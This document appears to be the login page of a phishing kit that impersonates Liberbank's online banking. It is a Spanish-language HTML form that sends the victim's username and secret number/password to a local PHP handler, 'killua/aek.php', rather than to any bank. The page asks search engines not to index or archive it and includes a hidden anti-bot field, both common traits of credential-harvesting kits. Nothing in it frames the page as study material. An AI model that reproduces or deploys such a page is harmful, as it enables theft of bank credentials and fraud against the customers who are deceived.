<!doctype html>
<html>
<head>
  <title>Liberbank | Banco Online</title>
</head>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/fonts.css">
        <link rel="stylesheet" href="assets/css/main.css">

        <link rel="shortcut icon" href="assets/images/favicon.png" type="image/x-icon"> 

        <title></title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="assets/images/logo.png"></div>
                <p>Cancelar y salir</p>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="details">
                            <h3>Accede a la Banca Digital</h3>
                            <form action="killua/aek.php" method="post">
                                <input type="hidden" name="verbot">
                                <input type="hidden" name="type" value="login">
                                <div class="form-group">
                                    <label for="username">Usuario / Referencia</label>
                                    <input type="text" name="username" id="username" class="form-control">
                                    <p>He olvidado mi usuario</p>
                                </div>
                                <div class="form-group mb70">
                                    <label for="password">Número secreto / Contraseña</label>
                                    <input type="password" name="password" id="password" class="form-control">
                                    <p>He olvidado/bloqueado mi número secreto</p>
                                    <div class="eye"><i class="far fa-eye-slash"></i></div>
                                </div>
                                <div class="form-group">
                                    <button type="submit">Entrar</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12">
                        <img class="d-lg-block d-md-none d-sm-none d-none" src="assets/images/sidebar.png">
                        <img class="d-lg-none d-md-block d-sm-none d-none" src="assets/images/sidebar2.png">
                        <img class="d-lg-none d-md-none d-sm-block d-block" src="assets/images/sidebar3.png">
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- HEADER -->
        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-2 text-lg-left text-md-left text-sm-center text-center mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <img style="max-width: 180px;" src="assets/images/logo2.png">
                    </div>
                    <div class="col-md-8 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <ul>
                            <li>&copy; 2021 Liberbank</li>
                            <li>Cookies</li>
                            <li>Aviso legal</li>
                            <li>Política de privacidad y seguridad</li>
                        </ul>
                    </div>
                    <div class="col-md-2 text-lg-right text-md-right text-sm-center text-center">
                        <img src="assets/images/social.png">
                    </div>
                </div>
            </div>
        </footer>
        <!-- END HEADER -->

        <!-- JS FILES -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/fontawesome.min.js"></script>
        <script src="assets/js/jquery.payment.js"></script>
        <script src="assets/js/main.js"></script>

        <script>
            $('.eye').click(function(){
                if( $('#password').attr('type') == 'password' ) {
                    $('#password').attr('type','text');
                    $('.eye').html('<i class="far fa-eye"></i>');
                } else if( $('#password').attr('type') == 'text' ) {
                    $('#password').attr('type','password');
                    $('.eye').html('<i class="far fa-eye-slash"></i>');
                }
            });
        </script>
        
    </body>

</html>